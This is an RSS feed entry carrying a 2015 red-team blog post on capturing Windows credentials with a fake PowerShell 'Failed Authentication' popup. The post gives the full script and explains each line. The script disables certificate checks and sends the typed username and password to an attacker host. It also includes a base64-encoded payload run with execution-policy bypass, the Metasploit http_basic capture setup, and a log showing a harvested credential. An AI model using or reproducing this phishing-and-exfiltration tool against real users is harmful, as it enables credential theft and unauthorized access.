<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Credentials on Room362</title>
    <link>https://room362.com/tags/credentials/</link>
    <description>Recent content in Credentials on Room362</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Mon, 12 Jan 2015 17:52:10 -0500</lastBuildDate>
    <atom:link href="https://room362.com/tags/credentials/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Powershell Popups &#43; Capture</title>
      <link>https://room362.com/post/2015/powershell-popups-and-capture/</link>
      <pubDate>Mon, 12 Jan 2015 17:52:10 -0500</pubDate>
      
      <guid>https://room362.com/post/2015/powershell-popups-and-capture/</guid>
      <description>&lt;p&gt;Metasploit Minute has entered into it&amp;rsquo;s 3rd &amp;ldquo;season&amp;rdquo;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute on a system without any other code on disk and get creds constantly as any level of user. No admin, no UAC bypass needed. Just a bunch of creds for free.. over SSL. ;-)&lt;/p&gt;

&lt;p&gt;Here is the video:&lt;/p&gt;

&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/H_E3FNF8rBw&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;p&gt;Here is the code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$cred = $host.ui.promptforcredential(&#39;Failed Authentication&#39;,&#39;&#39;,[Environment]::UserDomainName + &amp;quot;\&amp;quot; + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$wc = new-object net.webclient;
$wc.Headers.Add(&amp;quot;User-Agent&amp;quot;,&amp;quot;Wget/1.9+cvs-stable (Red Hat modified)&amp;quot;);
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, &#39;&#39;);
$result = $wc.downloadstring(&#39;https://172.16.102.163&#39;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets break down the code line by line:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$cred = $host.ui.promptforcredential(&#39;Failed Authentication&#39;,&#39;&#39;,[Environment]::UserName,[Environment]::UserDomainName);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This tells windows to prompt for credentials, with the title of &amp;ldquo;Failed Authentication&amp;rdquo;, no info in the comment (so it uses default), and include the username and domain in the box to add authenticity. Thats where all the magic is, everything else is just gravy.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tells powershell not to verify SSL certificates (allows us to use self signed certs in the HTTPS transaction later&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$wc = new-object net.webclient;
$wc.Headers.Add(&amp;quot;User-Agent&amp;quot;,&amp;quot;Wget/1.9+cvs-stable (Red Hat modified)&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Creates a new webclient object and sets its user agent to &amp;lsquo;wget&amp;rsquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tells powershell to use whatever proxy the current user uses with whatever credentials they have cached. If one or both are unnecessary it just ignores these settings.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, &#39;&#39;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tells powershell that the HTTP-Basic credentials to use are the ones typed in the popup box recently by the user.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$result = $wc.downloadstring(&#39;https://172.16.102.163&#39;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And finally the request to HTTP-Basic capture module in metasploit, but you could have anything you want capture these creds.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cat power.txt | iconv --to-code UTF-16LE | base64

JABjAHIAZQBkACAAPQAgACQAaABvAHMAdAAuAHUAaQAuAHAAcgBvAG0AcAB0AGYAbwByAGMAcgBlAGQAZQBuAHQAaQBhAGwAKAAnAEYAYQBpAGwAZQBkACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACcALAAnACcALABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBVAHMAZQByAEQAbwBtAGEAaQBuAE4AYQBtAGUAIAArACAAIgBcACIAIAArACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBOAGEAbQBlACwAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBEAG8AbQBhAGkAbgBOAGEAbQBlACkAOwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACQAdwBjACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsACgAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGcAZQB0AC8AMQAuADkAKwBjAHYAcwAtAHMAdABhAGIAbABlACAAKABSAGUAZAAgAEgAYQB0ACAAbQBvAGQAaQBmAGkAZQBkACkAIgApADsACgAkAHcAYwAuAFAAcgBvAHgAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsACgAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsACgAkAHcAYwAuAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAG4AZQB0AHcAbwByAGsAYwByAGUAZABlAG4AdABpAGEAbAAoACQAYwByAGUAZAAuAHUAcwBlAHIAbgBhAG0AZQAsACAAJABjAHIAZQBkAC4AZwBlAHQAbgBlAHQAdwBvAHIAawBjAHIAZQBkAGUAbgB0AGkAYQBsACgAKQAuAHAAYQBzAHMAdwBvAHIAZAAsACAAJwAnACkAOwAKACQAcgBlAHMAdQBsAHQAIAA9ACAAJAB3AGMALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADcAMgAuADEANgAuADEAMAAyAC4AMQA2ADMAJwApADsACgA=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then execute &lt;code&gt;powershell -ep bypass -enc &amp;lt;the encoded text from above&amp;gt;&lt;/code&gt; and you get this:&lt;/p&gt;

&lt;p&gt;Image should be here: &lt;img src=&#34;https://room362.com/images/2015/powershellpopup.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~/metasploit-framework# ./msfconsole -Lq
msf &amp;gt; use auxiliary/server/capture/http_basic
msf auxiliary(http_basic) &amp;gt; show options

Module options (auxiliary/server/capture/http_basic):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   REALM        Secure Site      yes       The authentication realm you&#39;d like to present.
   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
   SRVHOST      0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT      80               yes       The local port to listen on.
   SSL          false            no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   SSLVersion   SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
   URIPATH                       no        The URI to use for this exploit (default is random)

msf auxiliary(http_basic) &amp;gt; set SSL true
SSL =&amp;gt; true
msf auxiliary(http_basic) &amp;gt; set SRVPORT 443
SRVPORT =&amp;gt; 443
msf auxiliary(http_basic) &amp;gt; set URIPATH /
URIPATH =&amp;gt; /
msf auxiliary(http_basic) &amp;gt; run
[*] Auxiliary module execution completed
msf auxiliary(http_basic) &amp;gt;
[*] Listening on 0.0.0.0:443...
[*] Using URL: https://0.0.0.0:443/
[*]  Local IP: https://172.16.102.163:443/
[*] Server started.
[*] 172.16.102.140   http_basic - Sending 401 to client 172.16.102.140
[+] 172.16.102.140 - Credential collected: &amp;quot;SITTINGDUCK\user:ASDqwe123&amp;quot; =&amp;gt; /
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Game over!&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>